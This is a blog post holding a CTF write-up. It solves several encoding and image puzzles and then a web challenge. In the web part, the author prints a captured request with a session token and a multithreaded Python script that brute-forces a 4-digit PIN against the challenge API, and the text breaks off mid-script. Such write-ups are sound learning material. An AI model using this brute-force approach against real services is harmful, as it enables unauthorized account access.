<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NexusCTF Write-Up By YoSheep | YoSheep's 学习笔记</title><meta name="author" content="YoSheep"><meta name="copyright" content="YoSheep"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NexusCTF Write-Up By YoSheep PLACE: 5th POINTS: 4150 SOLVES: 30  很艰难的一场，毒狼战团队赛，一年多没打手还没算很生。由于本场比赛没有要求交所有题目的Write-up，以下挑了几个题来写。Web的题目和一些我觉得有意思的我会写的尽量细一些。   MiscellaneousAnnoying? No.I obtained a binary">
<meta property="og:type" content="article">
<meta property="og:title" content="NexusCTF Write-Up By YoSheep">
<meta property="og:url" content="https://yosheep.github.io/posts/6d596838.html">
<meta property="og:site_name" content="YoSheep&#39;s 学习笔记">
<meta property="og:description" content="NexusCTF Write-Up By YoSheep PLACE: 5th POINTS: 4150 SOLVES: 30  很艰难的一场，毒狼战团队赛，一年多没打手还没算很生。由于本场比赛没有要求交所有题目的Write-up，以下挑了几个题来写。Web的题目和一些我觉得有意思的我会写的尽量细一些。   MiscellaneousAnnoying? No.I obtained a binary">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yosheep.github.io/img/yeah_circle.jpg">
<meta property="article:published_time" content="2025-10-09T13:52:25.000Z">
<meta property="article:modified_time" content="2025-10-09T13:53:37.642Z">
<meta property="article:author" content="YoSheep">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yosheep.github.io/img/yeah_circle.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yosheep.github.io/posts/6d596838.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: YoSheep","link":"链接: ","source":"来源: YoSheep's 学习笔记","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'NexusCTF Write-Up By YoSheep',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-10-10 00:53:37'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="YoSheep's 学习笔记" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/yeah_circle.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="YoSheep's 学习笔记"><span class="site-name">YoSheep's 学习笔记</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NexusCTF Write-Up By YoSheep</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-09T13:52:25.000Z" title="发表于 2025-10-10 00:52:25">2025-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-09T13:53:37.642Z" title="更新于 2025-10-10 00:53:37">2025-10-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NexusCTF Write-Up By YoSheep"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/6d596838.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/6d596838.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="NexusCTF-Write-Up-By-YoSheep"><a href="#NexusCTF-Write-Up-By-YoSheep" class="headerlink" title="NexusCTF Write-Up By YoSheep"></a>NexusCTF Write-Up By YoSheep</h1><blockquote>
<p>PLACE: 5th</p>
<p>POINTS: 4150</p>
<p>SOLVES: 30</p>
</blockquote>
<p>很艰难的一场，毒狼战团队赛，一年多没打手还没算很生。由于本场比赛没有要求交所有题目的Write-up，以下挑了几个题来写。Web的题目和一些我觉得有意思的我会写的尽量细一些。</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002225103748.png" alt="image-20251002225103748"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002225041688.png" alt="image-20251002225041688"></p>
<h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Annoying-No"><a href="#Annoying-No" class="headerlink" title="Annoying? No."></a>Annoying? No.</h3><p>I obtained a binary string from the file <code>binary.txt</code>. To recover the hidden message, convert each 8-bit chunk into its corresponding ASCII character.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bits = <span class="string">&quot;01001110 01100101 01111000 01110101 01110011 01000011 01010100 01000110 01111011 01101110 00110000 01110100 01011111 01000000 01110011 01011111 01000000 01101110 01101110 01101111 01111001 01101001 01101110 01100111 01111101&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">2</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> bits.split()))</span><br></pre></td></tr></table></figure>

<p>Run the script, get the flag</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002205110274.png" alt="image-20251002205110274"></p>
<p>Flag: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;n0t_@s_@nnoying&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Unzip the attachment, and I can get following files:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002205807369.png" alt="image-20251002205807369"></p>
<p>Each image looks like a binary pattern, because mostly black and white, which makes me think they might represent encoded bits.</p>
<p>Here is an example of one of the images:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002205826913.png" alt="image-20251002205826913"></p>
<p>I write a Python script to combine the five images. My idea is that XOR-ing the images can cancel out the common background and reveal hidden content.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># File paths</span></span><br><span class="line">files = [</span><br><span class="line">    <span class="string">&quot;Never.png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Stands.png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Still.png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The.png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Truth.png&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load images and convert to numpy arrays</span></span><br><span class="line">images = [np.array(Image.<span class="built_in">open</span>(f).convert(<span class="string">&quot;L&quot;</span>)) <span class="keyword">for</span> f <span class="keyword">in</span> files]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stack images to check if combining reveals hidden text (XOR/average)</span></span><br><span class="line">xor_combined = images[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> images[<span class="number">1</span>:]:</span><br><span class="line">    xor_combined = np.bitwise_xor(xor_combined, img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Average</span></span><br><span class="line">avg_combined = np.mean(images, axis=<span class="number">0</span>).astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save results</span></span><br><span class="line">xor_image_path = <span class="string">&quot;xor_combined.png&quot;</span></span><br><span class="line">Image.fromarray(xor_combined).save(xor_image_path)</span><br></pre></td></tr></table></figure>

<p>Run the script and get the result reveals the hidden message:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002210703721.png" alt="image-20251002210703721"></p>
<p>You can vaguely see the ON-THE-MOVE</p>
<p>Flag: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;ON_THE_MOVE&#125;</span><br></pre></td></tr></table></figure>

<h3 id="The-Tower-of-Babel"><a href="#The-Tower-of-Babel" class="headerlink" title="The Tower of Babel"></a>The Tower of Babel</h3><p>I open the challenge link and switch between subtitle tracks. Each track contains a group of Morse code, giving me four groups in total.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002211021098.png" alt="image-20251002211021098"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002211036090.png" alt="image-20251002211036090"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002211050470.png" alt="image-20251002211050470"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002211103715.png" alt="image-20251002211103715"></p>
<p>Decode each group and obtain the words <code>REPRESENTATION</code> <code>MANY</code> <code>LANGUAGES</code> <code>ONE</code>, arrange them into a sentence to form the flag</p>
<p>Flag: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;MANY LANGUAGES ONE REPRESENTATION&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Space-and-Time"><a href="#Space-and-Time" class="headerlink" title="Space and Time"></a>Space and Time</h3><p>After getting the attachment, open it with 010editor,  and nothing meaningful appeared in plain ASCII.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002211825604.png" alt="image-20251002211825604"></p>
<p>See the hint:</p>
<blockquote>
<p>There are many displays between the 7-segment and the 21st centyury’s dot matrix. The old archive once known as Wikipedia may provide the right hardware used to encode this intermediate step.</p>
</blockquote>
<p>so I suspected the data was not stored as text but rather as segment encodings.</p>
<p><strong>Step 1</strong> – Recognizing 7-Segment Codes</p>
<p>Each byte in the binary corresponds to a common 7-segment display bitmask. <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seven-segment_display">Wikipedia</a></p>
<p>and I ask Chatgpt to map each byte using the standard 7-segment lookup table, the binary file decodes into a long hex sting:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E6EDEDFDE6F1E639EDEDEDE6E6E7E6F1E6F9</span><br></pre></td></tr></table></figure>

<p>At this point, I try to decode this as hex → ASCII. But when I do that directly, only get garbage characters.</p>
<p><strong>Step 2</strong> – The Intermediate Technology</p>
<p>The hint mentioned “displays between 7-segment and dot matrix.” Checking <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Fourteen-segment_display">Wikipedia’s article on 14-segment displays</a>, I realized that this was the missing link.</p>
<p>Unlike simple 7-segment displays that only show numbers, a 14-segment alphanumeric display can represent both digits and letters. Its encoding tables are expressed in hexadecimal values like 0xE6, 0xED, etc. – exactly the kind of values we see in the string above.</p>
<p><strong>Step 3</strong> – Grouping the Data</p>
<p>If I treat the hex string as raw ASCII, it fails. But when I group every two bytes together, something interesting happens:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E6ED  EDFD  E6F1  E639  EDED  EDE6  E6E7  E6F1  E6F9</span><br></pre></td></tr></table></figure>

<p>Each pair can now be interpreted as <strong>two 14-segment codes</strong>, each corresponding to a single hex digit. Together, they form an ASCII code.</p>
<p>For example:</p>
<ul>
<li>E6ED → digits 4 and 5 → hex 0x45 → ‘E’</li>
<li>EDFD → digits 5 and 6 → hex 0x56 → ‘V’</li>
<li>E6F1 → digits 4 and F → hex 0x4F → ‘O’</li>
<li>E639 → digits 4 and C → hex 0x4C → ‘L’</li>
</ul>
<p>Finally, decoding all groups get:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVOLUTION</span><br></pre></td></tr></table></figure>

<p>Flag: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;EVOLUTION&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A-Star-Trail"><a href="#A-Star-Trail" class="headerlink" title="A Star Trail"></a>A Star Trail</h3><p>The challenge asks me to submit the flag by taking the first character of each planet&#x2F;asteroid in my chosen path and then appending the number of days the path takes (with one decimal place).</p>
<p>Download the attachment, and I get the image:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251002214737126.png" alt="image-20251002214737126"></p>
<p>Honestly, I skip scripting and manually calculate the shortest route to extract the code, a bit silly, but it works fast for this size.🤣</p>
<p>The shortest path is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EARTH ---&gt; PALLUS-XA ---&gt; 12-PUCK-8 ---&gt; JIP-REIA ---&gt; TAYLOR-3489 ---&gt; LANCER-PXKRD</span><br></pre></td></tr></table></figure>

<p>The total distance is 21, so we can get the flag</p>
<p>Flag: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;P1JT-21.0&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="Conditional-Constellation"><a href="#Conditional-Constellation" class="headerlink" title="Conditional Constellation"></a>Conditional Constellation</h3><p>I visit the challenge link and see a 90-second timer that forces me to crack a 4-digit PIN within the time window. </p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003021226413.png" alt="image-20251003021226413"></p>
<p>I capture the traffic with Burp while trying a PIN. The request looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/pin/attempt HTTP/1.1</span><br><span class="line">Host: 34.129.100.231:5058</span><br><span class="line">Content-Length: 4</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Authorization: CCSessionToken U2FsdGVkX19+RBTErIvcpk1QCIPQXkDtZMYEdAaxTWfVwMbsjodX5ilVorYZ2Cy67MvAJv4J54HqQthu6yYSgg==</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://34.129.100.231:5058</span><br><span class="line">Referer: http://34.129.100.231:5058/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p>We can see, the post body is the pin that I entered. And there is a CCSessionToken, I think it represnets a session, which I start a new star. What’s more, I get the traffic, which using to genrate session:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003021607582.png" alt="image-20251003021607582"></p>
<p>write a python script to brute force the pin, and manual generate a new sessiion to give me enough time(actually, if add the progress of genertate new session into the script would be better):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://34.129.100.231:5058/api/v1/pin/attempt&quot;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;TestClient/1.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;CCSessionToken U2FsdGVkX1+GJSEf9r0NrHCHN8Kyyq+6Fw/X6TkHIxvV0FMEDTx+QTUK99Cx4UZaOCfRyoK24W+yUMTlkLYjZg==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">START = <span class="number">1000</span></span><br><span class="line">END = <span class="number">9999</span></span><br><span class="line">WORKERS = <span class="number">50</span></span><br><span class="line">REQ_TIMEOUT = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">found = threading.Event()</span><br><span class="line">found_result = &#123;<span class="string">&quot;pin&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;resp&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">tried = <span class="number">0</span></span><br><span class="line">tried_lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_one</span>(<span class="params">pin</span>):</span><br><span class="line">    <span class="keyword">global</span> tried</span><br><span class="line">    <span class="keyword">if</span> found.is_set():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.headers.update(HEADERS)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = sess.post(URL, data=<span class="built_in">str</span>(pin), timeout=REQ_TIMEOUT)</span><br><span class="line">        text = r.text <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> tried_lock:</span><br><span class="line">            tried += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;NexusCTF&#123;&quot;</span> <span class="keyword">in</span> text <span class="keyword">or</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found.is_set():</span><br><span class="line">                found_result[<span class="string">&quot;pin&quot;</span>] = pin</span><br><span class="line">                found_result[<span class="string">&quot;resp&quot;</span>] = text</span><br><span class="line">                found.<span class="built_in">set</span>()</span><br><span class="line">            <span class="keyword">return</span> (pin, text, r.status_code)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sess.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pins = <span class="built_in">range</span>(START + <span class="number">1</span>, END + <span class="number">1</span>)</span><br><span class="line">    start_ts = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[i] Trying pins <span class="subst">&#123;START+<span class="number">1</span>&#125;</span>..<span class="subst">&#123;END&#125;</span> with <span class="subst">&#123;WORKERS&#125;</span> workers&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=WORKERS) <span class="keyword">as</span> ex:</span><br><span class="line">        futures = &#123;ex.submit(try_one, p): p <span class="keyword">for</span> p <span class="keyword">in</span> pins&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> fut <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                <span class="keyword">if</span> found.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                res = fut.result()</span><br><span class="line">                <span class="keyword">if</span> tried % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                    elapsed = time.time() - start_ts</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[i] Tried ~<span class="subst">&#123;tried&#125;</span> so far, elapsed <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    pin, txt, status = res</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found PIN <span class="subst">&#123;pin&#125;</span> (status=<span class="subst">&#123;status&#125;</span>)&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(txt)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Interrupted by user&quot;</span>)</span><br><span class="line">    total_time = time.time() - start_ts</span><br><span class="line">    <span class="keyword">if</span> found.is_set():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] PIN=<span class="subst">&#123;found_result[<span class="string">&#x27;pin&#x27;</span>]&#125;</span> (elapsed <span class="subst">&#123;total_time:<span class="number">.2</span>f&#125;</span>s)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(found_result[<span class="string">&quot;resp&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 